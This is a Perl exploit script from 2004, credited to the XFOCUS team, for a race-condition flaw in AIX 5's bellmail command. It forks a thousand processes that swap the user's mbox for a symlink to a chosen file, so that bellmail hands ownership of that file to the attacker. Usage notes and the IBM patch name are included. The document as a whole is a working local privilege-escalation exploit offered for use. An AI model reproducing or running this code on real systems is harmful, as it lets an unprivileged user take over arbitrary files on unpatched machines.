#!/usr/bin/perl
# FileName: x_aix5_bellmail.pl
# Exploit "Race condition vulnerability (BUGTRAQ  ID: 8805)" of /usr/bin/bellmail
#         command on Aix5 to change any file owner to current user.
#
#Usage    : x_aix5_bellmail.pl aim_file
#           aim_file : then file wich you want to chown to you.
#    Note : Maybe you should run more than one to "Race condition".
#           The file named "x_bell.sh" can help you to use this exp.
#           You should type "w" "Enter" then "q"  "Enter" key on keyboard
#          as fast as you can when bellmail prompt "?" appear.
#
# Author  : watercloud@xfocus.org
#     XFOCUS Team    
#     http://www.xfocus.net   (CN)
#     http://www.xfocus.org   (EN)
#
# Date    : 2004-6-6
# Tested  : on  Aix5.1. ML01
# Addition: IBM had offered a patch named "IY25661" for it.
# Announce: use as your owner risk!

$CMD="/usr/bin/bellmail";
$MBOX="$ENV{HOME}/mbox";
$TMPFILE="/tmp/.xbellm.tmp";

$AIM_FILE = shift @ARGV ;
$FORK_NUM = 1000;

die "AIM FILE \"$AIM_FILE\" not exist.\n" if ! -e $AIM_FILE;

unlink $MBOX;
system "echo abc > $TMPFILE";
system "$CMD $ENV{LOGIN} < $TMPFILE";
unlink $TMPFILE;

$ret=`ls -l $AIM_FILE"`;
print "Before: $ret";

if( fork()==0 )
{
        &deamon($FORK_NUM);
        exit 0 ;
}
sleep( (rand()*100)%4);
exec $CMD;

$ret=`ls -l $AIM_FILE"`;
print "Now: $ret";

sub deamon {
        $num = shift || 1;
        for($i=0;$i<$num;$i++) {
                &do_real() if fork()==0;
        }
}
sub do_real {
        if(-e $MBOX) {
                unlink $MBOX ;
                symlink "$AIM_FILE",$MBOX;
        }
        exit 0;
}
#EOF
